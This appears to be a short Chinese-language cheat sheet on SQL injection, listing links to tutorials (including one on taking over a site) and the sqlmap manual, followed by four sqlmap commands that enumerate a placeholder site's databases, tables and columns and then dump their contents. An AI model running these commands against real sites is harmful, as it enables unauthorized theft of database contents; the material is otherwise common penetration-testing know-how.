目录
	SQL注入方法

[使用SQLMAP对网站和数据库进行SQL注入攻击](http://drops.wooyun.org/tips/2113)

[Sqlmap注入技巧收集整理](http://www.lxway.com/4089025404.htm)

[sqlmap 寻找注入点](http://www.lxway.com/931786.html)

[没有注入点，如何拿站](http://www.lxway.com/912111582.htm)

[手工注入](http://www.rising.com.cn/newsletter/news/2012-05-24/11580.html)

[sqlmap](https://github.com/sqlmapproject/sqlmap)

[SQL注入 | 最棒的相关资料汇总](http://mp.weixin.qq.com/s?__biz=MzAwMTUyMjQ5OA==&mid=402619216&idx=1&sn=0c2b3c741449ddb859203ebcc8eb04af&scene=0#wechat_redirect)

[sqlmap手册](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md)

sqlmap步骤
//查数据库 
1、sqlmap -u http://www.xxx.com --dbs 
//查数据库表 
2、sqlmap -u http://www.xxx.com -D 数据库名 --tables 
//查数据库表字段 
3、sqlmap -u http://www.xxx.com -D 数据库名 -T 表名 --columns 
//查数据库字段内容 
4、sqlmap -u http://www.xxx.com -D 数据库名 -T 表名 -C 字段名1，字段名2，字段名3 --dump
